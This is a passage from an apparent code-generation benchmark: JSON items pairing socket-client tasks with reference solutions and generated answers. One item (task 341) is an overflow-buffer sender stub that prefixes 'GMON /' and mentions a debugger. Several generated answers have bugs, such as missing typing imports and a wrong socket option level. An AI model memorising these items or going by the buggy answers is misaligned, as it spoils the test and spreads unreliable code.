    "right_result": "import socket\nimport subprocess\nimport threading\n\nclass AdbConnector:\n    def __init__(self, adb_host: str = 'localhost') -> None:\n        self.adb_host = adb_host\n        self.socket = None\n        self.packet_buffer = b''\n        self._disposed = False\n        self.adb_proc = None\n        self.connect()\n\n    def _relaunch_adb_bridge(self) -> None:\n        if self.adb_proc and self.adb_proc.poll() is None:\n            self.adb_proc.terminate()\n        self.adb_proc = subprocess.Popen(['adb', 'bridge'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n        self.connect()\n\n    def connect(self) -> None:\n        self._disposed = False\n        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        try:\n            self.socket.connect((self.adb_host, 5037))\n        except Exception as e:\n            self._relaunch_adb_bridge()\n            self.socket = None\n        self.read_loop()\n\n    def send_request(self, packet_type: int, packet_payload: bytes) -> None:\n        if self._disposed:\n            return\n        if not self.socket or self.socket.closed:\n            self._relaunch_adb_bridge()\n        packet = bytearray()\n        packet.append(packet_type)\n        packet.extend(packet_payload)\n        self.socket.sendall(packet)\n\n    def read_loop(self) -> None:\n        if self._disposed:\n            return\n        while not self._disposed:\n            try:\n                data = self.socket.recv(1024)\n                if not data:\n                    break\n                self.packet_buffer += data\n                while len(self.packet_buffer) >= 2:\n                    packet_length = self.packet_buffer[0] << 8 | self.packet_buffer[1]\n                    if len(self.packet_buffer) < packet_length + 2:\n                        break\n                    packet = self.packet_buffer[2:packet_length + 2]\n                    self.packet_buffer = self.packet_buffer[packet_length + 2:]\n                    # Process the packet here\n            except Exception as e:\n                self._disposed = True\n                self.dispose(True)\n\n    def dispose(self, disposing: bool = True) -> None:\n        self._disposed = True\n        if self.socket:\n            self.socket.close()\n        if self.adb_proc and self.adb_proc.poll() is None:\n            self.adb_proc.terminate()"
  },
  {
    "Task_id": 332,
    "Instruction": "Task Description: Create a Python class that collects and processes statistics from a Memcached server using TCP socket communication.\n\nClass Description: The MemcachedCollector class is designed to connect to a Memcached server, retrieve its statistics, and parse them into a structured dictionary format. It handles both IPv4 and Unix domain socket connections.\n\nAttributes:\n\nGAUGES: [list] - A list of metric names that should be treated as gauge values (values that can increase or decrease)\n\nMethods:\n\nget_raw_stats: [Name](host, port) -> [str] - Establishes a TCP connection to the specified Memcached server (either via IP:port or Unix socket), sends the 'stats' command, and returns the raw response data as a string. Handles connection errors gracefully.\n\nInput:\n- host: [str] - The server address (IP for network connections or path for Unix sockets)\n- port: [int/str/None] - The server port (None for Unix socket connections)\n\nOutput:\n- [str] - Raw statistics data in Memcached protocol format\n\nget_stats: [Name](host, port) -> [dict] - Retrieves and processes statistics from the Memcached server, returning them as a dictionary with metric names as keys and numeric values (either int or float).\n\nInput:\n- host: [str] - The server address (IP for network connections or path for Unix sockets)\n- port: [int/str/None] - The server port (None for Unix socket connections)\n\nOutput:\n- [dict] - Processed statistics with metric names as keys and numeric values",
    "Canonical_solution": "import socket\nimport re\n\nclass MemcachedCollector:\n    GAUGES = [\n        'bytes',\n        'connection_structures',\n        'curr_connections',\n        'curr_items',\n        'threads',\n        'reserved_fds',\n        'limit_maxbytes',\n        'hash_power_level',\n        'hash_bytes',\n        'hash_is_expanding',\n        'uptime'\n    ]\n\n    def get_raw_stats(self, host, port):\n        data = ''\n        try:\n            if port is None:\n                sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n                sock.connect(host)\n            else:\n                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n                sock.connect((host, int(port)))\n\n            sock.settimeout(3)\n            sock.send('stats\\n')\n\n            while True:\n                received = sock.recv(4096)\n                if not received:\n                    break\n                data += received\n                if data.endswith('END\\r\\n'):\n                    break\n        except socket.error:\n            pass\n        finally:\n            sock.close()\n        return data\n\n    def get_stats(self, host, port):\n        ignored = ('libevent', 'pointer_size', 'time', 'version',\n                   'repcached_version', 'replication', 'accepting_conns',\n                   'pid')\n        stats = {}\n        data = self.get_raw_stats(host, port)\n\n        for line in data.splitlines():\n            pieces = line.split(' ')\n            if pieces[0] != 'STAT' or pieces[1] in ignored:\n                continue\n            if '.' in pieces[2]:\n                stats[pieces[1]] = float(pieces[2])\n            else:\n                stats[pieces[1]] = int(pieces[2])\n\n        return stats",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "right_result": "class MemcachedCollector:\n    GAUGES = ['bytes', 'curr_items', 'total_items', 'total_size', 'evictions', 'get_hits', 'get_misses', 'delete_hits', 'delete_misses', 'cmd_get', 'cmd_set', 'cmd_flush', 'auth_errors', 'cas_errors', 'cas_rejected', 'items_evicted', 'bytes_read', 'bytes_written', 'uptime', 'time']\n    \n    def get_raw_stats(self, host, port):\n        import socket\n        if port is None:\n            sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n            try:\n                sock.connect(host)\n            except Exception as e:\n                return str(e)\n            try:\n                sock.sendall(b'stats\\n')\n                response = sock.recv(4096)\n                sock.close()\n                return response.decode('utf-8')\n            except Exception as e:\n                return str(e)\n        else:\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            try:\n                sock.connect((host, int(port)))\n            except Exception as e:\n                return str(e)\n            try:\n                sock.sendall(b'stats\\n')\n                response = sock.recv(4096)\n                sock.close()\n                return response.decode('utf-8')\n            except Exception as e:\n                return str(e)\n    \n    def get_stats(self, host, port):\n        raw_stats = self.get_raw_stats(host, port)\n        if 'Connection refused' in raw_stats or 'Error' in raw_stats:\n            return {}\n        stats_dict = {}\n        lines = raw_stats.strip().split('\\n')\n        for line in lines:\n            if line.startswith('STAT'):\n                parts = line.split()\n                metric_name = parts[1]\n                value = parts[2]\n                if metric_name in self.GAUGES:\n                    stats_dict[metric_name] = float(value)\n                else:\n                    stats_dict[metric_name] = int(value)\n        return stats_dict"
  },
  {
    "Task_id": 334,
    "Instruction": "Task Description: Implement a TCP client socket class with additional Unix Domain Socket (UDS) functionality for inter-process communication, including message packing/unpacking and connection management.\n\nClass Description: HSFZSocket is a base TCP client class that handles socket creation, connection, and basic send/receive operations. UDS_HSFZSocket extends this base class to add UDS-specific message formatting with source/target identifiers.\n\nAttributes:\n- ip: str - The IP address of the target server (default: '127.0.0.1')\n- port: int - The port number of the target server (default: 6801)\n- s: socket.socket - The TCP socket object\n- buffer: bytes - Internal buffer for storing received data\n- source: int - (UDS only) Source identifier for messages\n- target: int - (UDS only) Target identifier for messages\n- outputcls: Type - (UDS only) Optional class for parsing received messages\n\nMethods:\n- __init__(ip: str = '127.0.0.1', port: int = 6801) -> None - Initializes the socket with TCP_NODELAY and SO_REUSEADDR options, then connects to the server\n- send(data: bytes) -> int - Sends raw data through the socket and returns number of bytes sent\n- recv(x: int = 65535) -> Optional[bytes] - Receives data with length-prefixed protocol (4-byte header), returns None if incomplete\n- close() -> None - Closes the socket connection\n- (UDS) send(x: Any) -> int - Formats message with UDS header (length, flags, source, target) before sending\n- (UDS) recv(x: int = 65535) -> Optional[Any] - Receives UDS message and optionally parses it using outputcls",
    "Canonical_solution": "import socket\nimport struct\nimport time\nfrom typing import Optional, Type, Any\n\nclass HSFZSocket:\n    def __init__(self, ip='127.0.0.1', port=6801):\n        self.ip = ip\n        self.port = port\n        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)\n        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        self.s.connect((self.ip, self.port))\n        self.buffer = b\"\"\n\n    def send(self, data):\n        try:\n            return self.s.send(data)\n        except Exception as e:\n            self.close()\n            raise e\n\n    def recv(self, x=65535):\n        if self.buffer:\n            len_data = self.buffer[:4]\n        else:\n            len_data = self.s.recv(4, socket.MSG_PEEK)\n            if len(len_data) != 4:\n                return None\n\n        len_int = struct.unpack(\">I\", len_data)[0]\n        len_int += 6\n        self.buffer += self.s.recv(len_int - len(self.buffer))\n\n        if len(self.buffer) != len_int:\n            return None\n\n        pkt = self.buffer\n        self.buffer = b\"\"\n        return pkt\n\n    def close(self):\n        self.s.close()\n\nclass UDS_HSFZSocket(HSFZSocket):\n    def __init__(self, source, target, ip='127.0.0.1', port=6801, basecls=None):\n        super().__init__(ip, port)\n        self.source = source\n        self.target = target\n        self.outputcls = basecls\n\n    def send(self, x):\n        try:\n            x.sent_time = time.time()\n        except AttributeError:\n            pass\n\n        try:\n            return super().send(\n                struct.pack(\"!IBB\", len(x) + 2, 1, self.source, self.target) + bytes(x))\n        except Exception as e:\n            self.close()\n            raise e\n\n    def recv(self, x=65535):\n        pkt = super().recv(x)\n        if pkt and self.outputcls:\n            return self.outputcls(pkt[6:])\n        return pkt",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\n\nclass HSFZSocket:\n    def __init__(self, ip: str = '127.0.0.1', port: int = 6801) -> None:\n        self.ip = ip\n        self.port = port\n        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.s.setsockopt(socket.SOL_SOCKET, socket.TCP_NODELAY, 1)\n        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        self.connect()\n\n    def connect(self) -> None:\n        self.s.connect((self.ip, self.port))\n\n    def send(self, data: bytes) -> int:\n        return self.s.send(data)\n\n    def recv(self, x: int = 65535) -> Optional[bytes]:\n        header = self.s.recv(4)\n        if not header:\n            return None\n        length = int.from_bytes(header, byteorder='big')\n        data = self.s.recv(length)\n        if len(data) < length:\n            return None\n        return data\n\n    def close(self) -> None:\n        self.s.close()\n\n\nclass UDS_HSFZSocket(HSFZSocket):\n    def __init__(self, ip: str = '127.0.0.1', port: int = 6801, source: int = 0, target: int = 0, outputcls=None) -> None:\n        super().__init__(ip, port)\n        self.source = source\n        self.target = target\n        self.outputcls = outputcls\n\n    def send(self, x: Any) -> int:\n        if not isinstance(x, (str, bytes, int, float, list, dict)):\n            raise ValueError(\"Invalid message type\")\n        length = len(x)\n        flags = 0\n        header = bytearray([length >> 24 & 0xFF, length >> 16 & 0xFF, length >> 8 & 0xFF, length & 0xFF])\n        header.extend([flags & 0xFF, self.source & 0xFF, self.target & 0xFF])\n        message = header + bytes(x)\n        return self.s.send(message)\n\n    def recv(self, x: int = 65535) -> Optional[Any]:\n        header = self.s.recv(7)\n        if not header:\n            return None\n        length = (header[0] << 24) | (header[1] << 16) | (header[2] << 8) | header[3]\n        flags = header[4]\n        source = header[5]\n        target = header[6]\n        data = self.s.recv(length)\n        if len(data) < length:\n            return None\n        if self.outputcls:\n            return self.outputcls(data)\n        return data"
  },
  {
    "Task_id": 335,
    "Instruction": "Task Description: Implement a TCP client class in Python that can connect to a server, send commands, and receive responses, including handling acknowledgment messages.\n\nClass Description: The TCPClient class establishes a TCP connection to a specified server and provides functionality to send commands and receive responses. It handles both text and binary data, and automatically closes the connection when done.\n\nAttributes:\n- sock: [socket.socket] - The TCP socket object used for communication with the server\n\nMethods:\n- __init__(port: int) -> None - Initializes the TCP client and connects to the specified port on localhost\n- send_commands(commands: list) -> None - Sends each command in the list to the server and prints the responses until receiving either an <ACK> or <NAK> message for each command",
    "Canonical_solution": "import socket\nfrom binascii import hexlify\n\nclass TCPClient:\n    def __init__(self, port: int):\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        server_address = (\"localhost\", port)\n        print(\"connecting to %s port %s\" % server_address)\n        self.sock.connect(server_address)\n\n    def send_commands(self, commands: list):\n        try:\n            for command in commands:\n                self.sock.sendall(bytes(command, 'utf-8'))\n                data = \"\"\n                while \"<ACK>\" not in data and \"<NAK>\" not in data:\n                    tmp = self.sock.recv(4096)\n                    if tmp == b\"\":\n                        continue\n                    try:\n                        data += tmp.decode('utf-8')\n                    except:\n                        data += hexlify(tmp).decode('utf-8')\n                print(data)\n        finally:\n            print(\"closing socket\")\n            self.sock.close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\n\nclass TCPClient:\n    def __init__(self, port: int) -> None:\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.connect(('localhost', port))\n\n    def send_commands(self, commands: list) -> None:\n        for command in commands:\n            self.sock.sendall(command.encode('utf-8'))\n            response = self.sock.recv(1024).decode('utf-8')\n            print(response)\n            if response == '<ACK>':\n                break\n            elif response == '<NAK>':\n                print(\"Command failed.\")\n                break\n        self.sock.close()"
  },
  {
    "Task_id": 336,
    "Instruction": "Task Description: Create a Python function that sends a TCP payload to a specified server using socket programming.\n\nFunction Description: The function establishes a TCP connection to a target server using IPv4, sends a payload, and then closes the connection. It handles the socket creation, connection, data transmission, and cleanup.\n\nInput:\n- target_ip: str - The IP address of the target server\n- target_port: int - The port number of the target server\n- payload: str - The data to be sent to the server\n\nOutput: None (The function does not return any value but sends the payload to the server)",
    "Canonical_solution": "import socket\n\ndef send_tcp_payload(target_ip: str, target_port: int, payload: str):\n    \"\"\"\n    Sends a TCP payload to a target server\n    \n    Args:\n        target_ip: IP address of target server\n        target_port: Port number of target server\n        payload: Data to send to server\n    \"\"\"\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((target_ip, target_port))\n    s.send(payload.encode())\n    s.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "right_result": "def send_tcp_payload(target_ip, target_port, payload):\n    import socket\n\n    try:\n        # Create a TCP socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        # Connect to the server\n        sock.connect((target_ip, target_port))\n        # Send the payload\n        sock.sendall(payload.encode('utf-8'))\n        # Close the connection\n        sock.close()\n    except Exception as e:\n        print(f\"An error occurred: {e}\")"
  },
  {
    "Task_id": 338,
    "Instruction": "Task Description: Create a TCP client class for interacting with the IQFeed server to send commands and receive market data.\n\nClass Description: The IQFeedClient class establishes and manages a TCP connection to an IQFeed server, allowing users to send commands/queries and receive responses. It handles connection setup, data transmission, error handling, and connection teardown.\n\nAttributes:\n_host: str - The hostname or IP address of the IQFeed server (default: 'localhost')\n_port: int - The port number for the IQFeed server connection (default: 9100)\n_timeout: float - The connection timeout in seconds (default: 10.0)\n_recv_buf: str - Buffer for storing received data\n_sock: socket.socket - The TCP socket object for server communication\n\nMethods:\n__init__(host: str = 'localhost', port: int = 9100, timeout: float = 10.0) -> None - Initializes the client with connection parameters and establishes the TCP connection\n_send_cmd(cmd: str) -> None - Sends a command string to the IQFeed server (private method)\nquery(message: str) -> Optional[List[str]] - Sends a query message to the server and returns the parsed response data\nclose() -> None - Closes the socket connection to the server",
    "Canonical_solution": "import socket\nimport logging\nimport numpy as np\nimport pandas as pd\n\nclass IQFeedClient:\n    def __init__(self, host: str = 'localhost', port: int = 9100, timeout: float = 10.0):\n        self._host = host\n        self._port = port\n        self._timeout = timeout\n        self._recv_buf = \"\"\n        \n        # Create and configure socket\n        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self._sock.connect((self._host, self._port))\n        self._sock.settimeout(self._timeout)\n\n    def _send_cmd(self, cmd: str):\n        \"\"\"Send command to IQFeed server\"\"\"\n        self._sock.sendall(cmd.encode(encoding='latin-1', errors='strict'))\n\n    def query(self, message: str):\n        \"\"\"Send query to IQFeed server and receive response\"\"\"\n        end_msg = '!ENDMSG!'\n        recv_buffer = 4096\n\n        self._send_cmd(message)\n\n        chunk = \"\"\n        data = \"\"\n        while True:\n            chunk = self._sock.recv(recv_buffer).decode('latin-1')\n            data += chunk\n            if chunk.startswith('E,'):  # error condition\n                if chunk.startswith('E,!NO_DATA!'):\n                    logging.warn('No data available for the given symbol or dates')\n                    return None\n                else:\n                    raise Exception(chunk)\n            elif end_msg in chunk:\n                break\n\n        # Clean up the data\n        data = data[:-1 * (len(end_msg) + 3)]\n        data = \"\".join(data.split(\"\\r\"))\n        data = data.replace(\",\\n\", \",\")[:-1]\n        return data.split(\",\")\n\n    def close(self):\n        \"\"\"Close the socket connection\"\"\"\n        self._sock.close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\n\nclass IQFeedClient:\n    def __init__(self, host: str = 'localhost', port: int = 9100, timeout: float = 10.0) -> None:\n        self._host = host\n        self._port = port\n        self._timeout = timeout\n        self._recv_buf = ''\n        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self._sock.settimeout(timeout)\n        try:\n            self._sock.connect((host, port))\n        except Exception as e:\n            print(f\"Connection failed: {e}\")\n            self._sock.close()\n            self._sock = None\n\n    def _send_cmd(self, cmd: str) -> None:\n        if self._sock:\n            try:\n                self._sock.sendall(cmd.encode('utf-8'))\n            except Exception as e:\n                print(f\"Send command failed: {e}\")\n\n    def query(self, message: str) -> Optional[List[str]]:\n        if not self._sock:\n            return None\n        try:\n            self._send_cmd(message)\n            self._recv_buf = ''\n            while True:\n                try:\n                    data = self._sock.recv(1024).decode('utf-8')\n                    if not data:\n                        break\n                    self._recv_buf += data\n                except socket.error as e:\n                    print(f\"Receive error: {e}\")\n                    break\n            lines = self._recv_buf.strip().split('\\n')\n            return lines\n        except Exception as e:\n            print(f\"Query error: {e}\")\n            return None\n\n    def close(self) -> None:\n        if self._sock:\n            self._sock.close()"
  },
  {
    "Task_id": 339,
    "Instruction": "Task Description: Create a Python class that implements TCP client functionality for testing server connections and sending data to a server.\n\nClass Description: The TargetSocket class provides TCP client capabilities to check server availability and send data to a specified port on localhost. It handles connection establishment, data transmission, and proper resource cleanup.\n\nAttributes:\n- sock: [socket.socket] - The socket object used for TCP communication (initially None)\n- targetPort: [int] - The target port number for server communication (default: 5001)\n\nMethods:\n- testServerConnectionTcp() -> [bool] - Tests if a connection can be established with the target server. Returns True if successful, False otherwise.\n- sendToSocket(data: str) -> [bool] - Attempts to send the provided string data to the target server. Makes up to 10 connection attempts with 100ms delays between attempts. Returns True if data was sent successfully, False otherwise.",
    "Canonical_solution": "import socket\n\nclass TargetSocket:\n    def __init__(self, target_port=5001):\n        self.sock = None\n        self.targetPort = target_port\n\n    def testServerConnectionTcp(self):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        server_address = ('localhost', self.targetPort)\n\n        try:\n            sock.connect(server_address)\n        except socket.error as exc:\n            return False\n\n        sock.close()\n        return True\n\n    def sendToSocket(self, data):\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(1)\n\n        host = 'localhost'\n        port = self.targetPort\n\n        isOpen = False\n        n = 0\n        while isOpen is False:\n            try:\n                s.connect((host, port))\n                isOpen = True\n            except Exception as e:\n                time.sleep(0.1)\n                n += 1\n                isOpen = False\n\n            if n == 10:\n                return False\n\n        try:\n            s.send(str.encode(data))\n        except Exception as e:\n            print(\"B: \" + str(e))\n\n        s.close()\n        return True",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\nimport time\n\nclass TargetSocket:\n    def __init__(self, targetPort=5001):\n        self.sock = None\n        self.targetPort = targetPort\n\n    def testServerConnectionTcp(self) -> bool:\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        try:\n            self.sock.connect((\"localhost\", self.targetPort))\n            return True\n        except (socket.error, socket.timeout) as e:\n            print(f\"Connection failed: {e}\")\n            return False\n        finally:\n            if self.sock:\n                self.sock.close()\n\n    def sendToSocket(self, data: str) -> bool:\n        max_attempts = 10\n        delay = 0.1\n        for attempt in range(max_attempts):\n            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            try:\n                self.sock.connect((\"localhost\", self.targetPort))\n                self.sock.sendall(data.encode('utf-8'))\n                self.sock.close()\n                return True\n            except (socket.error, socket.timeout) as e:\n                print(f\"Attempt {attempt + 1} failed: {e}\")\n                time.sleep(delay)\n                self.sock.close()\n        return False"
  },
  {
    "Task_id": 340,
    "Instruction": "Task Description: Create a Python class for handling Unix domain socket communication with a server, including sending and receiving serialized data, timeout management, and proper connection cleanup.\n\nClass Description: CSocket is a class that manages communication over a Unix domain socket. It handles socket creation, connection, data serialization/deserialization, timeout settings, and proper connection termination. The class uses pickle for object serialization and implements custom protocol handling with CSPROTO constants.\n\nAttributes:\n- __csock: [socket.socket] - The underlying Unix domain socket object\n- __deftout: [float] - The default timeout value for socket operations\n\nMethods:\n- __init__(sock: str, timeout: int = -1) -> None - Initializes the socket connection to the specified Unix domain socket path with optional timeout\n- __del__() -> None - Destructor that ensures proper socket cleanup\n- send(msg: Any, nonblocking: bool = False, timeout: Optional[float] = None) -> Any - Serializes and sends data to the server, then waits for and returns the response\n- settimeout(timeout: float) -> None - Sets the socket timeout (use -1 for default)\n- close() -> None - Properly closes the socket connection with protocol-compliant shutdown\n- convert(m: Any) -> Union[str, bool, int, float, list, dict, set] - Static method to convert objects to serializable types\n- receive(sock: socket.socket, nonblocking: bool = False, timeout: Optional[float] = None) -> Any - Static method to receive and deserialize data from the socket",
    "Canonical_solution": "import socket\nfrom pickle import dumps, loads, HIGHEST_PROTOCOL\nfrom ..protocol import CSPROTO\n\nclass CSocket:\n    def __init__(self, sock=\"/var/run/fail2ban/fail2ban.sock\", timeout=-1):\n        self.__csock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n        self.__deftout = self.__csock.gettimeout()\n        if timeout != -1:\n            self.settimeout(timeout)\n        self.__csock.connect(sock)\n\n    def __del__(self):\n        self.close()\n    \n    def send(self, msg, nonblocking=False, timeout=None):\n        obj = dumps(list(map(CSocket.convert, msg)), HIGHEST_PROTOCOL)\n        self.__csock.send(obj)\n        self.__csock.send(CSPROTO.END)\n        return self.receive(self.__csock, nonblocking, timeout)\n\n    def settimeout(self, timeout):\n        self.__csock.settimeout(timeout if timeout != -1 else self.__deftout)\n\n    def close(self):\n        if not self.__csock:\n            return\n        try:\n            self.__csock.sendall(CSPROTO.CLOSE + CSPROTO.END)\n            self.__csock.shutdown(socket.SHUT_RDWR)\n        except socket.error:\n            pass\n        try:\n            self.__csock.close()\n        except socket.error:\n            pass\n        self.__csock = None\n    \n    @staticmethod\n    def convert(m):\n        if isinstance(m, (str, bool, int, float, list, dict, set)):\n            return m\n        else:\n            return str(m)\n\n    @staticmethod\n    def receive(sock, nonblocking=False, timeout=None):\n        msg = CSPROTO.EMPTY\n        if nonblocking: sock.setblocking(0)\n        if timeout: sock.settimeout(timeout)\n        bufsize = 1024\n        while msg.rfind(CSPROTO.END, -32) == -1:\n            chunk = sock.recv(bufsize)\n            if not len(chunk):\n                raise socket.error(104, 'Connection reset by peer')\n            if chunk == CSPROTO.END: break\n            msg = msg + chunk\n            if bufsize < 32768: bufsize <<= 1\n        return loads(msg)",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\nimport pickle\nimport time\nfrom typing import Any, Optional, Union, List, Dict, Set, Tuple\n\nCSPROTO = 1\n\nclass CSocket:\n    def __init__(self, sock: str, timeout: int = -1) -> None:\n        self.__csock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n        self.__csock.connect(sock)\n        self.__deftout = timeout if timeout != -1 else 30.0\n        self.settimeout(self.__deftout)\n\n    def __del__(self) -> None:\n        self.close()\n\n    def send(self, msg: Any, nonblocking: bool = False, timeout: Optional[float] = None) -> Any:\n        if timeout is None:\n            timeout = self.__deftout\n        try:\n            serialized = self.convert(msg)\n            self.__csock.sendall(pickle.dumps(serialized))\n            return self.receive(self.__csock, nonblocking, timeout)\n        except Exception as e:\n            print(f\"Error sending data: {e}\")\n            return None\n\n    def settimeout(self, timeout: float) -> None:\n        self.__deftout = timeout\n\n    def close(self) -> None:\n        if self.__csock:\n            self.__csock.shutdown(socket.SHUT_RDWR)\n            self.__csock.close()\n\n    @staticmethod\n    def convert(m: Any) -> Union[str, bool, int, float, list, dict, set]:\n        if isinstance(m, (str, bool, int, float)):\n            return m\n        elif isinstance(m, (list, dict, set)):\n            return m\n        else:\n            raise TypeError(f\"Cannot serialize type: {type(m)}\")\n\n    @staticmethod\n    def receive(sock: socket.socket, nonblocking: bool = False, timeout: Optional[float] = None) -> Any:\n        if timeout is None:\n            timeout = 30.0\n        start_time = time.time()\n        while True:\n            if nonblocking:\n                try:\n                    data = sock.recv(4096)\n                    if data:\n                        return pickle.loads(data)\n                    else:\n                        return None\n                except BlockingIOError:\n                    time.sleep(0.1)\n                    if time.time() - start_time > timeout:\n                        return None\n            else:\n                data = sock.recv(4096)\n                if data:\n                    return pickle.loads(data)\n                else:\n                    return None"
  },
  {
    "Task_id": 341,
    "Instruction": "Task Description: Create a Python function that establishes a TCP connection to a server, receives initial data from the server, sends a buffer with a specific prefix, and handles connection errors gracefully.\n\nFunction Description: The function `send_buffer_to_server` creates a TCP socket, connects to a specified server, receives initial data, sends a buffer prefixed with \"GMON /\", and ensures proper connection closure. It includes error handling for connection issues.\n\nInput:\n- host: [str] - The IP address or hostname of the target server\n- port: [int] - The port number on which the server is listening\n- buffer: [str] - The data buffer to be sent to the server (will be prefixed with \"GMON /\")\n\nOutput:\n- None (prints status messages to console: received data, error messages, and confirmation of buffer sending)",
    "Canonical_solution": "import socket\n\ndef send_buffer_to_server(host, port, buffer):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    try:\n        s.connect((host, port))\n        data = s.recv(1024)\n        print \"\\n\" + data\n        s.send(\"GMON /\" + buffer + '\\r\\n')\n    except:\n        print \"Check your debugger\"\n    finally:\n        s.close()\n        print \"Buffer Sent!\"",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "right_result": "def send_buffer_to_server(host, port, buffer):\n    import socket\n\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(5)  # Set a timeout for the connection attempt\n        sock.connect((host, port))\n        print(f\"Connected to {host} on port {port}\")\n\n        # Receive initial data from the server\n        initial_data = sock.recv(1024)\n        print(f\"Received initial data: {initial_data.decode()}\")\n\n        # Prepare the buffer with the prefix\n        prefixed_buffer = b\"GMON /\" + buffer.encode()\n\n        # Send the buffer\n        sock.sendall(prefixed_buffer)\n        print(\"Buffer sent successfully\")\n\n        # Close the connection\n        sock.close()\n        print(\"Connection closed\")\n\n    except socket.error as e:\n        print(f\"Socket error: {e}\")\n    except Exception as e:\n        print(f\"An error occurred: {e}\")"
  },
  {
    "Task_id": 343,
    "Instruction": "Task Description: Implement a CMPP (China Mobile Peer-to-Peer) client class in Python that handles communication with a CMPP gateway server for sending SMS messages. The class should manage TCP socket connections, authentication, message sending, and response handling.\n\nClass Description: The CMPPClient class encapsulates the functionality to connect to a CMPP gateway server, authenticate using SP credentials, send SMS messages, and handle server responses. It maintains socket connections and sequence numbering for message tracking.\n\nAttributes:\n- ip: str - The IP address of the CMPP gateway server\n- port: int - The port number of the CMPP gateway server\n- sp_id: str - The service provider ID for authentication\n- sp_secret: str - The service provider secret for authentication\n- src_id: str - The source ID for SMS messages\n- service_id: str - The service ID for SMS messages\n- _sequence_id: int - Internal counter for message sequence numbers\n- _is_connect: bool - Connection status flag\n- _times: int - Number of connection retry attempts\n- __socket: socket.socket - The TCP socket object for server communication\n\nMethods:\n- __init__(host: str, port: int, sp_id: str, sp_secret: str, src_id: str, service_id: str) -> None - Initializes the client with server details and credentials\n- sequence_id() -> int - Property that returns and increments the sequence ID\n- _connect() -> None - Establishes TCP connection to the server with retry logic\n- send(instance: Union[CMPPBaseRequestInstance, bytes]) -> None - Sends a CMPP request or raw message to the server\n- recv() -> tuple - Receives and parses a response from the server\n- close() -> None - Closes the connection and sends termination request\n- _cmpp_connect() -> None - Handles CMPP authentication protocol\n- _cmpp_send_sms(dest: List[str], sign_name: str, template_code: str, template_param: Dict) -> None - Internal method for sending SMS messages\n- send_sms(dest: List[str], sign_name: str, template_code: str, template_param: Dict) -> None - Public method for sending SMS with error handling",
    "Canonical_solution": "import socket\nimport struct\nimport time\nfrom typing import List, Dict\n\nclass CMPPClient:\n    def __init__(self, host: str, port: int, sp_id: str, sp_secret: str, src_id: str, service_id: str):\n        self.ip = host\n        self.port = port\n        self.sp_id = sp_id\n        self.sp_secret = sp_secret\n        self.src_id = src_id\n        self.service_id = service_id\n        self._sequence_id = 0\n        self._is_connect = False\n        self._times = 3\n        self.__socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self._connect()\n\n    @property\n    def sequence_id(self) -> int:\n        s = self._sequence_id\n        self._sequence_id += 1\n        return s\n\n    def _connect(self) -> None:\n        self.__socket.settimeout(5)\n        for i in range(self._times):\n            try:\n                self.__socket.connect((self.ip, self.port))\n                self._is_connect = True\n                break\n            except Exception as err:\n                time.sleep(1)\n        else:\n            raise Exception('Failed to connect to the CMPP gateway server')\n\n    def send(self, instance) -> None:\n        if isinstance(instance, CMPPBaseRequestInstance):\n            message = instance.get_message(sequence_id=self.sequence_id)\n        else:\n            message = instance\n        self.__socket.send(message)\n\n    def recv(self) -> tuple:\n        raw_length = self.__socket.recv(4)\n        length, = struct.unpack('!L', raw_length)\n        header, body = CMPPResponseInstance().parse(\n            raw_length + self.__socket.recv(length - 4)\n        )\n        return header, body\n\n    def close(self) -> None:\n        if self._is_connect:\n            terminate_request = CMPPTerminateRequestInstance()\n            self.send(terminate_request)\n            self.__socket.close()\n\n    def _cmpp_connect(self) -> None:\n        connect_request = CMPPConnectRequestInstance(self.sp_id, self.sp_secret)\n        self.send(connect_request)\n        header, body = self.recv()\n        if body['Status'] != 0:\n            raise Exception('CMPPv2.0 authentication failed')\n\n    def _cmpp_send_sms(self, dest: List[str], sign_name: str, template_code: str, template_param: Dict) -> None:\n        message = template_param.get('message')\n        if message is None:\n            code = template_param.get('code')\n            message = template_code.replace('{code}', code)\n        msg = '\u3010%s\u3011 %s' % (sign_name, message)\n        submit_request = CMPPSubmitRequestInstance(\n            msg_src=self.sp_id, src_id=self.src_id, msg_content=msg,\n            dest_usr_tl=len(dest), 